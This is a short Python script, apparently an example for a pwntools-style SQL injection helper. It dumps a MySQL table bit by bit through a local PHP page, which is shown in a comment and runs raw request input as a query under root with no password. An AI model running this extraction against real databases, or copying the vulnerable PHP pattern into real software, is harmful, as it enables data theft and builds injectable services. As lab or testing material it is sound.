from pwn import *
import time, random, urllib2, urllib

def f(req):
    time.sleep(random.random())
    f = urllib2.urlopen('http://localhost/index.php', urllib.urlencode({'query' : req}))
    r = f.read()
    return r

# index.php contains:
# <?php
# if ($mysql = mysql_connect("localhost", "root", "")) {
#    mysql_select_db("pwntest");
#    $res = mysql_query($_REQUEST['query']);
#    echo mysql_result($res, 0);
# }
# ?>

print sqli.bitwise(f, sqli.requests.mysql_dump('test', ['foo', 'bar', 'baz']))
